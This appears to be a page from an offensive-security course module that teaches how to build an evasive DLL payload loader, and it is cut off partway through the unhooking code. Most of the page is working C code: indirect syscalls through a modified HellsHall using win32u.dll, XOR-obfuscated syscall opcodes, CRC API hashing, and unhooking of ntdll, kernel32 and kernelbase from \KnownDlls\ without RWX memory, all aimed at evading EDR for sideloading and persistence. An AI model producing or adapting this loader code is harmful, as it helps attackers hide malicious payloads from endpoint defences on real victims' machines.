      <div id="height-container" class="flex h-full min-h-[800px]">
          <div class="flex max-w-full min-w-full">
              <div class="flex-1 min-w-0">
                  
                  <div id="description-container" class="viewer code-description h-full w-full bg-gray-800/70 backdrop-blur-md backdrop-saturate-150 p-4 px-5 md:px-10 lg:px-20 border border-t-0 border-gray-600/60 shadow-inner">

    
    <div id="module-skeleton" role="status" aria-live="polite" class="absolute inset-0 z-20 overflow-hidden bg-slate-900/70 ring-1 ring-white/10">
    <div class="h-full w-full max-w-5xl mx-auto py-8 animate-pulse motion-reduce:animate-none flex flex-col">

        
        <div class="flex flex-col items-center gap-3">
        <div class="h-7 w-72 rounded-xl bg-white/15"></div>
        <div class="h-px w-full bg-white/10"></div>
        </div>

        
        <div class="h-6 w-40 rounded-lg bg-white/12"></div>

        
        <div class="space-y-3 mb-6">
        <div class="h-4 w-full rounded-lg bg-white/10"></div>
        <div class="h-4 w-11/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-10/12 rounded-lg bg-white/10"></div>
        <div class="h-4 w-9/12  rounded-lg bg-white/10"></div>
        </div>

        
        <div class="h-56 md:h-72 lg:h-80 rounded-xl bg-white/5 ring-1 ring-white/10 flex items-center justify-center">
        <svg viewBox="0 0 64 64" aria-hidden="true" class="w-12 h-12 text-white/30" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="8" y="14" width="48" height="36" rx="3" class="opacity-30"></rect>
            <circle cx="26" cy="28" r="5"></circle>
            <path d="M16 46l12-14 8 10 8-8 12 12"></path>
        </svg>
        </div>

        
        <div class="mt-6 flex-1 relative rounded-xl overflow-hidden">
        <div class="absolute inset-0 rounded-xl" style="
            background:
                linear-gradient(to right, transparent 0, transparent 8px, rgba(255,255,255,0.00) 8px, rgba(255,255,255,0.00) calc(100% - 8px), transparent 100%),
                repeating-linear-gradient(
                to bottom,
                rgba(255,255,255,0.10),                 /* line color */
                rgba(255,255,255,0.10) 12px,            /* line thickness */
                rgba(255,255,255,0.00) 12px,            /* gap start */
                rgba(255,255,255,0.00) 22px             /* gap height */
                );
            ">
        </div>
        </div>

    </div>
    </div>


    
    

    
    <div id="module-content" class="opacity-0 transition-opacity duration-300">
        <h2>Building An Evasive DLL Payload Loader</h2>
<h3>Introduction</h3>
<p>Leading up to this module, the course has covered various individual 
evasion techniques but hasn't integrated them into practical real-world 
projects. However, in this module, readers will acquire the skills to 
develop a reliable and stealthy DLL payload loader. This module will not
 only introduce new concepts but also enhance previously taught evasion 
techniques, resulting in a more comprehensive and effective approach for
 each method.</p>
<h3>Benefits Of a DLL Loader</h3>
<p>The payload loader to be created will take the form of a DLL file for several reasons:</p>
<ul>
<li>
<p>DLLs can be discreetly loaded and executed by legitimate applications
 while they are running, rendering them less conspicuous compared to 
standalone EXE files.</p>
</li>
<li>
<p>They can be effectively used in DLL search order exploits, such as DLL sideloading.</p>
</li>
<li>
<p>DLLs offer better opsec persistence approaches when sideloaded.</p>
</li>
</ul>
<p>With that being said, the next section will dive into the loader's features.</p>
<h3>Loader's Capabilities</h3>
<p>The loader being built will have the following features:</p>
<ul>
<li>
<p>Indirect-Syscalls using an improved HellsHall implementation.</p>
</li>
<li>
<p>Dll Unhooking via the <code>\KnownDlls\</code> directory without using RWX memory permissions.</p>
</li>
<li>
<p>Payload injection by chunking, possibly evading EDR events filters.</p>
</li>
<li>
<p>Using custom AES encryption library.</p>
</li>
<li>
<p>Executing payload via <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pool-api">Thread Pool APIs</a>.</p>
</li>
<li>
<p>Obfuscating IAT using API hashing and API camouflage.</p>
</li>
<li>
<p>CRT library independent.</p>
</li>
</ul>
<h3>Improving HellsHall</h3>
<p>HellsHall, introduced in <em>Module 89: Indirect Syscalls - HellsHall</em>,
 serves the purpose of evading user-land hooking through the utilization
 of indirect syscalls. It accomplishes this by redirecting execution to a
 <code>syscall</code> instruction located within <code>ntdll.dll</code>, rather than executing it directly from the implementation's memory.</p>
<p>The DLL loader we're developing will leverage HellsHall, with a 
slight modification applied to it. This modification is related to the 
unhooking routine that will be using the <code>PAGE_READWRITE</code> (RW) memory permission, instead of using the <code>PAGE_EXECUTE_READWRITE</code> (RWX) permission. However, this choice comes with a limitation: this makes it impossible to execute anything within <code>ntdll.dll</code>'s address space.</p>
<p>In simpler terms, attempting to jump to a <code>syscall</code> instruction in <code>ntdll.dll</code> will trigger a <code>STATUS_ACCESS_VIOLATION</code>
 exception because an attempt was made to execute code in a 
non-executable memory region. To resolve this issue, the loader will 
need to find a <code>syscall</code> instruction situated outside of <code>ntdll.dll</code>'s address space.</p>
<p>To do this, the <code>win32u.dll</code> library will be used which contains syscall functions that have <code>syscall</code> instructions that our loader can leverage.</p>
<h3>Using Win32u.dll</h3>
<p>The <code>win32u.dll</code> library is a component of the Win32 subsystem, offering a range of user-mode graphics-related functions. Within <code>win32u.dll</code>, there are syscall functions that have <code>syscall</code>
 instructions that our loader can use when executing HellsHall. With 
that in mind, invoking a syscall within the loader will now take the 
following form:</p>
<img width="700px" alt="image" style="margin:auto" src="23_files/dllldr-165914382-cef5a4eb-e1e3-495f-9dce-e29119c0fd7f.png">
<p>Opening <code>win32u.dll</code> using the <em>HxD binary editor</em> allows one to see the <code>syscall ret</code> opcodes (<code>0F05C3</code>) which are the opcodes that our loader will jump to.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-265595541-ebb3522d-7824-48c3-a2ee-502b9a709813.png">
<br>
<h3>HellsHall's New Functions</h3>
<p>The new HellsHall implementation will contain the following functions:</p>
<ul>
<li>
<p>A function that will calculate all the required virtual addresses of a
 specified DLL module. This function will be called twice, once for <code>ntdll.dll</code> and the other for <code>win32u.dll</code>.</p>
</li>
<li>
<p>A function that will search <code>win32u.dll</code>'s address space for <code>syscall</code> and <code>ret</code> instructions.</p>
</li>
<li>
<p>A function that will search <code>ntdll.dll</code>'s address space for the specified syscall's System Service Number (SSN).</p>
</li>
</ul>
<h3>Loading Win32u.dll</h3>
<p>Given the critical role of <code>win32u.dll</code> in the new 
HellsHall implementation, it is crucial to ensure the DLL is loaded in 
the local process before proceeding with any other actions. While it is 
possible to load <code>win32u.dll</code> at runtime using the <code>LoadLibrary</code> WinAPI, a better approach is to load it statically via the IAT of our implementation.</p>
<p>The function <code>AddWin32uToIat</code> shown below leverages the <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpathw">SHGetFolderPathW</a> WinAPI, which is exported from the <code>shell32.dll</code> DLL. Notably, <code>shell32.dll</code> itself loads the <code>win32u.dll</code> DLL for its internal functions, thus ensuring that <code>win32u.dll</code> will also be loaded upon our DLL file is loaded into a process.</p>
<pre><code class="language-C">// This function loads win32u.dll into the IAT
VOID AddWin32uToIat() {

	WCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}
</code></pre>
<h3>MODULE_CONFIG Structure</h3>
<p>Part of our requirement in the updated HellsHall is to access exported functions by the <code>ntdll</code> and <code>win32u</code> DLLs. The <code>MODULE_CONFIG</code> structure is used for ease of accessing a DLL's virtual addresses without having to calculate it repeatedly. The <code>MODULE_CONFIG</code> structure is defined as follows:</p>
<pre><code class="language-C">typedef struct _MODULE_CONFIG
{

    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses
 of the DLL's exported functions    [BaseAddress + 
IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of 
the DLL's exported functions        [BaseAddress + 
IMAGE_EXPORT_DIRECTORY.AddressOfNames]
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals 
of the DLL's exported functions     [BaseAddress + 
IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]    
    DWORD       dwNumberOfNames;     // The number of exported functions
 of the DLL                         
[IMAGE_EXPORT_DIRECTORY.NumberOfNames]
    ULONG_PTR   uModule;             // The base address of the DLL - 
required to calculate future VAs      [BaseAddress]
    BOOLEAN     bInitialized;        // Set to TRUE if all members are 
initialized

} MODULE_CONFIG, *PMODULE_CONFIG;
</code></pre>
<p>Given that two DLL libraries are involved in the updated HellsHall implementation, it's necessary to define two global <code>MODULE_CONFIG</code> structure variables.</p>
<pre><code class="language-C">// Global variables
MODULE_CONFIG   g_NtdllConf   = { 0 };
MODULE_CONFIG   g_Win32uConf  = { 0 };
</code></pre>
<br>
<h3>InitDllsConfigStructs Function</h3>
<p>The <code>InitDllsConfigStructs</code> function initializes <code>g_NtdllConf</code> and <code>g_Win32uConf</code>. It takes two parameters and returns <code>TRUE</code> when all members of the structure are populated; otherwise, it returns <code>FALSE</code>. The function's parameters are detailed below:</p>
<ul>
<li>
<p><code>pModuleConf</code> - A pointer to a <code>MODULE_CONFIG</code> structure to populate.</p>
</li>
<li>
<p><code>uBaseAddress</code> - A DLL's base address for populating the <code>MODULE_CONFIG</code> structure.</p>
</li>
</ul>
<pre><code class="language-C">BOOL InitDllsConfigStructs(OUT 
PMODULE_CONFIG pModuleConf, IN ULONG_PTR uBaseAddress) {

    if ((pModuleConf-&gt;uModule = uBaseAddress) == NULL)
        return FALSE;

    // Fetching the NT headers of the DLL
    PIMAGE_NT_HEADERS pImgNtHdrs = 
(PIMAGE_NT_HEADERS)(pModuleConf-&gt;uModule + 
((PIMAGE_DOS_HEADER)pModuleConf-&gt;uModule)-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Fetching the export directory of the DLL
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = 
(PIMAGE_EXPORT_DIRECTORY)(pModuleConf-&gt;uModule + 
pImgNtHdrs-
&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


    // Initalizing the 'MODULE_CONFIG' structure
    pModuleConf-&gt;dwNumberOfNames         = 
pImgExpDir-&gt;NumberOfNames;
    pModuleConf-&gt;pdwArrayOfNames         = ( PDWORD ) 
(pModuleConf-&gt;uModule + pImgExpDir-&gt;AddressOfNames);
    pModuleConf-&gt;pdwArrayOfAddresses     = ( PDWORD ) 
(pModuleConf-&gt;uModule + pImgExpDir-&gt;AddressOfFunctions);
    pModuleConf-&gt;pwArrayOfOrdinals       = ( PWORD  ) 
(pModuleConf-&gt;uModule + pImgExpDir-&gt;AddressOfNameOrdinals);

    // Checking if all members are initialized
    if (!pModuleConf-&gt;dwNumberOfNames || 
!pModuleConf-&gt;pdwArrayOfNames || !pModuleConf-&gt;pdwArrayOfAddresses
 || !pModuleConf-&gt;pwArrayOfOrdinals)
        return FALSE;

    pModuleConf-&gt;bInitialized = TRUE;
	
    return TRUE;
}
</code></pre>
<h3>FetchWin32uSyscallInst Function</h3>
<p>The <code>FetchWin32uSyscallInst</code> function serves the purpose of locating a <code>syscall</code> instruction in the exported functions of <code>win32u.dll</code> that is immediately followed by a <code>ret</code> instruction. <code>FetchWin32uSyscallInst</code> requires one parameter and returns <code>TRUE</code> if it was able to fetch a <code>syscall</code> instruction address. <code>FetchWin32uSyscallInst</code>'s required parameter is shown below:</p>
<ul>
<li><code>ppSyscallInstAddress</code> - Pointer to a <code>PVOID</code> variable that will be used to hold the address of the <code>syscall</code> instruction found.</li>
</ul>
<p>Additionally, the function incorporates several evasion techniques outlined below:</p>
<ul>
<li>
<p>Syscall obfuscation - The global variable <code>g_SYSCALL_OPCODE</code> is derived from the <code>syscall</code> instruction's opcode (<code>0x050F</code>) XOR'd with <code>0x25</code>. This operation obscures the original <code>syscall</code>
 instruction's opcode, making it less susceptible to detection by static
 scanners designed to identify direct syscall attempts. The use of the <code>volatile</code>
 keyword ensures that the XOR decryption operation is carried out at 
runtime rather than compile time, preventing the static exposure of the <code>syscall</code> instruction's opcode.</p>
</li>
<li>
<p>Returning different syscall instructions - To enhance evasion, the function tries to return a different <code>syscall</code> instruction each time it is invoked. This behavior is governed by the <code>iSeed</code> and <code>iCounter</code> variables. <code>iSeed</code> represents a randomly generated value during runtime, which the function utilizes to determine when to return. In other words, <code>FetchWin32uSyscallInst</code> will provide the address of the <code>syscall</code> instruction at the <code>iSeed</code>-th position, ensuring that it does not return the first encountered <code>syscall</code> instruction address on each call.</p>
</li>
</ul>
<pre><code class="language-C">#define	SYSCALL_STUB_SIZE            0x20	
	// The size of a syscall stub is 32-byte
#define RET_SYSCALL_OPCODE           0xC3

volatile unsigned short g_SYSCALL_OPCODE = 0x052A;	// 0x050F ^ 0x25

BOOL FetchWin32uSyscallInst(OUT PVOID* ppSyscallInstAddress) {

    INT     iSeed       = rand() % 0x10,  // Between 0 and 15
            iCounter    = 0x00;

    // Initialize win32u.dll structure 
    if (!g_Win32uConf.bInitialized) {
        if (!InitDllsConfigStructs(&amp;g_Win32uConf, 
GetModuleHandle(L"win32u.dll")))
            return FALSE;
    }

    for (DWORD i = 0; i &lt; g_Win32uConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_Win32uConf.uModule + 
g_Win32uConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_Win32uConf.uModule + 
g_Win32uConf.pdwArrayOfAddresses[g_Win32uConf.pwArrayOfOrdinals[i]]);

       for (DWORD ii = 0; ii &lt; SYSCALL_STUB_SIZE; ii++){

            // Search for 'syscall' instruction
            // 'g_SYSCALL_OPCODE' is 0x050F ^ 0x25, thus XOR'ing it with
 0x25 now
            if (*(unsigned short*)((ULONG_PTR)pFuncAddress + ii) == 
(g_SYSCALL_OPCODE ^ 0x25) &amp;&amp; *(BYTE*)((ULONG_PTR)pFuncAddress + 
ii + sizeof(unsigned short)) == RET_SYSCALL_OPCODE) {
                // Used to determine a random 'syscall' instruction 
address
                if (iCounter == iSeed) {
                    *ppSyscallInstAddress = 
(PVOID)((ULONG_PTR)pFuncAddress + ii);
                    break;
                }

                iCounter++;
            }
        }

        if (*ppSyscallInstAddress)
            return TRUE;
    }

    return FALSE;
}
</code></pre>
<h3>Updating FetchNtSyscall</h3>
<p>The final function in the updated HellsHall implementation, called <code>FetchNtSyscall</code>, closely resembles the original one in <em>Module 89: Indirect Syscalls - HellsHall</em>, with a minor modification. In the current version, the <code>FetchNtSyscall</code> function will invoke <code>FetchWin32uSyscallInst</code> to retrieve the address of the <code>syscall</code> instruction from the memory space of <code>win32u.dll</code> rather than searching within <code>ntdll.dll</code>. <code>FetchNtSyscall</code> expects two parameters:</p>
<ul>
<li>
<p><code>dwSysHash</code> - This parameter represents the hash value of the syscall for which the SSN needs to be fetched.</p>
</li>
<li>
<p><code>pNtSys</code> - This is a pointer to an <code>NT_SYSCALL</code> structure that encapsulates all the necessary details for executing an indirect syscall.</p>
</li>
</ul>
<h4>NT_SYSCAL Structure</h4>
<p>The <code>NT_SYSCALL</code> structure is shown below:</p>
<pre><code class="language-C">typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // Syscall number
    DWORD dwSyscallHash;            // Syscall hash value
    PVOID pSyscallInstAddress;      // Address of a random 'syscall' instruction in win32u.dll    

} NT_SYSCALL, * PNT_SYSCALL;
</code></pre>
<h4>CRCHASH Macro</h4>
<p>The <code>FetchNtSyscall</code> function uses a macro called <code>CRCHASH</code>,
 which accepts an input string and returns its hash value using the 
Cyclic Redundancy Check (CRC) calculation method, as implemented in the <code>CRC32B</code> function provided below.</p>
<pre><code class="language-C">#define CRC_POLYNOMIAL                      0xEDB88320

UINT32 CRC32B(LPCSTR cString) 
{

    UINT32      uMask   = 0x00,
                uHash   = 0xFFFFFFFF;
    INT         i       = 0x00;

    while (cString[i] != 0) {

        uHash = uHash ^ (UINT32)cString[i];

        for (int ii = 0; ii &lt; 8; ii++) {

            uMask = -1 * (uHash &amp; 1);
            uHash = (uHash &gt;&gt; 1) ^ (CRC_POLYNOMIAL &amp; uMask);
        }

        i++;
    }

    return ~uHash;
}

#define CRCHASH(STR)    ( CRC32B( (LPCSTR)STR ) )
</code></pre>
<h4>FetchNtSyscall Function</h4>
<p><code>FetchNtSyscall</code> returns <code>TRUE</code> if all the structure's members are populated.</p>
<pre><code class="language-C">#define UP                      ( -1 * SYSCALL_STUB_SIZE )
#define DOWN                    SYSCALL_STUB_SIZE
#define SEARCH_RANGE            0xFF

#define MOV1_SYSCALL_OPCODE     0x4C
#define R10_SYSCALL_OPCODE      0x8B
#define RCX_SYSCALL_OPCODE      0xD1
#define MOV2_SYSCALL_OPCODE     0xB8
#define JMP_SYSCALL_OPCODE      0xE9

BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // Initialize ntdll config 
    if (!g_NtdllConf.bInitialized) {
        if (!InitDllsConfigStructs(&amp;g_NtdllConf, GetModuleHandle(L"ntdll.dll")))
            return FALSE;
    }

    if ((pNtSys-&gt;dwSyscallHash = dwSysHash) == NULL)
        return FALSE;

    for (DWORD i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName    = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress  = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // If syscall hash value found
        if (CRCHASH(pcFuncName) == dwSysHash) {

            // The syscall is not hooked
            if (*((PBYTE)pFuncAddress) == MOV1_SYSCALL_OPCODE
                &amp;&amp; *((PBYTE)pFuncAddress + 1) == R10_SYSCALL_OPCODE
                &amp;&amp; *((PBYTE)pFuncAddress + 2) == RCX_SYSCALL_OPCODE
                &amp;&amp; *((PBYTE)pFuncAddress + 3) == MOV2_SYSCALL_OPCODE
                &amp;&amp; *((PBYTE)pFuncAddress + 6) == 0x00
                &amp;&amp; *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE    high   = *((PBYTE)pFuncAddress + 5);
                BYTE    low    = *((PBYTE)pFuncAddress + 4);
                pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                break; // break for-loop [i]
            }

            // If hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == JMP_SYSCALL_OPCODE) {

                for (WORD idx = 1; idx &lt;= SEARCH_RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == JMP_SYSCALL_OPCODE) {

                for (WORD idx = 1; idx &lt;= SEARCH_RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == MOV1_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * DOWN) == R10_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * DOWN) == RCX_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * DOWN) == MOV2_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == MOV1_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 1 + idx * UP) == R10_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 2 + idx * UP) == RCX_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 3 + idx * UP) == MOV2_SYSCALL_OPCODE
                        &amp;&amp; *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        &amp;&amp; *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE    high   = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE    low    = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]
        }

    }

    if (pNtSys-&gt;dwSSn == NULL)
        return FALSE;

    // Search for a 'syscall' instruction in win32u.dll
    return FetchWin32uSyscallInst(&amp;pNtSys-&gt;pSyscallInstAddress);
}
</code></pre>
<h3>NT_API Structure</h3>
<p>Since the HellsHall implementation has been finalized, the <code>NT_API</code> structure will be introduced, which will contain all the <code>NT_SYSCALL</code> structures related to the syscalls that will be invoked by the loader.</p>
<pre><code class="language-C">typedef struct _NT_API {

    NT_SYSCALL	NtOpenSection;                     // Unhooking routine
    NT_SYSCALL	NtMapViewOfSection;                // Unhooking routine
    NT_SYSCALL	NtProtectVirtualMemory;            // Injection routine
    NT_SYSCALL	NtUnmapViewOfSection;              // Unhooking routine
    NT_SYSCALL  NtAllocateVirtualMemory;           // Injection routine
    NT_SYSCALL  NtDelayExecution;                  // Delay execution  

    BOOL        bInit;                             // Set to TRUE if initialized.

} NT_API, * PNT_API;


NT_API		g_Nt			= { 0 };             // Global variable to be used across the loader.
</code></pre>
<h3>InitIndirectSyscalls Function</h3>
<p>The function <code>InitIndirectSyscalls</code> will be called to populate an <code>NT_API</code> structure. The <code>InitIndirectSyscalls</code> function will call <code>FetchNtSyscall</code> for every <code>NT_SYSCALL</code> structure in <code>NT_API</code>. <code>InitIndirectSyscalls</code> returns a value of <code>TRUE</code> if all the elements within the input NT_API have been populated. The function takes one parameter, <code>Nt</code>, a pointer to an <code>NT_API</code> structure to be populated.</p>
<p>It's important to mention that the syscall hashes, which are necessary for calling <code>FetchNtSyscall</code>,
 are generated using the CRC string hashing algorithm that was 
introduced earlier. The hash generator program will be made available 
alongside the module's source code.</p>
<pre><code class="language-C">// HASHES
#define NtOpenSection_CRC32                 0x709DE3CC
#define NtMapViewOfSection_CRC32            0xA4163EBC
#define NtProtectVirtualMemory_CRC32        0x5C2D1A97
#define NtUnmapViewOfSection_CRC32          0x90483FF6
#define NtAllocateVirtualMemory_CRC32       0xE0762FEB
#define NtDelayExecution_CRC32              0xF5A86278


BOOL InitIndirectSyscalls(OUT PNT_API Nt) {

    if (Nt-&gt;bInit)
        return TRUE;

    if (!FetchNtSyscall(NtOpenSection_CRC32, &amp;Nt-&gt;NtOpenSection)) 
        return FALSE;

    if (!FetchNtSyscall(NtMapViewOfSection_CRC32, &amp;Nt-&gt;NtMapViewOfSection)) 
        return FALSE;

    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;Nt-&gt;NtProtectVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtUnmapViewOfSection_CRC32, &amp;Nt-&gt;NtUnmapViewOfSection)) 
        return FALSE;

    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;Nt-&gt;NtAllocateVirtualMemory)) 
        return FALSE;

    if (!FetchNtSyscall(NtDelayExecution_CRC32, &amp;Nt-&gt;NtDelayExecution)) 
        return FALSE;

    Nt-&gt;bInit = TRUE;

    return TRUE;
}
</code></pre>
<h3>Unhooking Without RWX permissions</h3>
<p>When unhooking NTDLL was performed in previous modules, they followed the same approach of modifying the <code>.text</code> section of the target DLL to grant it <code>PAGE_EXECUTE_READWRITE</code> memory permissions. This technique allowed us to overwrite <code>.text</code> with the unhooked version while still permitting execution.</p>
<p>In contrast, this module will use an improved technique to avoid the 
use of RWX memory permissions. The reason behind this technique is that 
using RWX permissions can be suspicious and may draw the attention of 
EDR systems.</p>
<p>Additionally, the loader will utilize the <code>\KnownDlls\</code> 
directory to retrieve the unhooked versions of the first three DLL 
images loaded into the local process. These initial images typically 
include <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code>,
 which are precisely the areas where EDRs are most vigilant about 
detecting user-land hooks. To sidestep the need for RWX permissions, the
 loader will instead configure the memory permissions of the target 
DLL's <code>.text</code> section as <code>PAGE_READWRITE</code>, which prevents execution. However, before doing so, a <em>Vectored Exception Handler</em> (VEH) will be established. The unhooking routine is outlined in the following diagram.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-365904197-762242cc-4b14-4757-aab1-ca31fc9f6dd9.png">
<h3>MapDllFromKnownDllDir Function</h3>
<p>The <code>MapDllFromKnownDllDir</code> function is shown below which maps the unhooked version of the <code>szDllName</code> DLL into the local process. If the mapping is successful, <code>MapDllFromKnownDllDir</code> returns the base address of the mapped DLL.</p>
<pre><code class="language-C">LPVOID MapDllFromKnownDllDir(IN PWSTR 
szDllName) {

	PVOID                  pModule                 = NULL;
	HANDLE                 hSection                 = INVALID_HANDLE_VALUE;
	UNICODE_STRING         UniString               = { 0 };
	OBJECT_ATTRIBUTES      ObjectiveAttr           = { 0 };
	SIZE_T                 sViewSize               = NULL;
	NTSTATUS               STATUS                  = 0x00;
	WCHAR                  wFullDllPath [MAX_PATH] = { L'\\', L'K', L'n', 
L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	// Construct the dll's path in the knowndlls dir
	wcscat(wFullDllPath, szDllName);

	// Construct a unicode string array containg the string created earlier
	UniString.Buffer = (PWSTR)wFullDllPath;
	UniString.Length = UniString.MaximumLength = wcslen(wFullDllPath) * 
sizeof(WCHAR);

	// Create the object attribute structure required for the NtOpenSection
 syscall
	InitializeObjectAttributes(&amp;ObjectiveAttr, &amp;UniString, 
OBJ_CASE_INSENSITIVE, NULL, NULL);

	// Open a section to the knowndll dll
	SET_SYSCALL(g_Nt.NtOpenSection);
	if (!NT_SUCCESS(STATUS = RunSyscall(&amp;hSection, SECTION_MAP_READ | 
SECTION_MAP_EXECUTE, &amp;ObjectiveAttr))) {
		return NULL;
	}

	// Map the section into the local process
	SET_SYSCALL(g_Nt.NtMapViewOfSection);
	if (!NT_SUCCESS(STATUS = RunSyscall(hSection, NtCurrentProcess(), 
&amp;pModule, NULL, NULL, NULL, &amp;sViewSize, ViewUnmap, NULL, 
PAGE_READONLY))) {
		return NULL;
	}

	return pModule;
}
</code></pre>
<h3>UnhookAllLoadedDlls Function</h3>
<p>Next, we create the <code>UnhookAllLoadedDlls</code> function that serves the purpose of unhooking DLLs such as <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code>. The typical code for <code>UnhookAllLoadedDlls</code> was previously discussed in <em>Module 85: NTDLL Unhooking - From KnownDlls Directory</em>. However, upon discovering the specific details of the local <code>.text</code> section, including its address and size, the <code>UnhookAllLoadedDlls</code> function additionally stores this information in global variables for potential later use by the VEH function.</p>
<p>The function does not utilize the <code>PAGE_EXECUTE_READWRITE</code> or <code>PAGE_EXECUTE_WRITECOPY</code> memory permissions. Instead, it uses the <code>PAGE_READWRITE</code> permission in its initial <code>NtProtectVirtualMemory</code> call. It's worth mentioning that since the <code>UnhookAllLoadedDlls</code> function relies on the <code>g_Nt</code> global variable, it is essential to call <code>InitIndirectSyscalls</code> beforehand to ensure that all syscalls used within <code>UnhookAllLoadedDlls</code> (as well as <code>MapDllFromKnownDllDir</code>) are valid.</p>
<pre><code class="language-C">#define text_CRC32                   	
0xA21C1EA3    // CRC hash of ".text"

// Global variables
SIZE_T					g_sTextSectionSize              = NULL;
LPVOID					g_pLocalTxtSectionAddress       = NULL; 
LPVOID					g_pKnownDllTxtSectionAddress    = NULL;


VOID UnhookAllLoadedDlls(){

	NTSTATUS		STATUS		= 0x00;
	PPEB			pPeb		= (PPEB)__readgsqword(0x60);
	PLIST_ENTRY		pHeadEntry	= 
&amp;pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList,
				    pNextEntry	= pHeadEntry-&gt;Flink;
	INT			    iModules	= 0x00;				// Will be used as a counter for unhooked
 dlls

	if (!g_Nt.bInit) {
		return;
	}

	//Skip the local .exe image
	pNextEntry = pNextEntry-&gt;Flink;

	// loop through all the loaded dlls
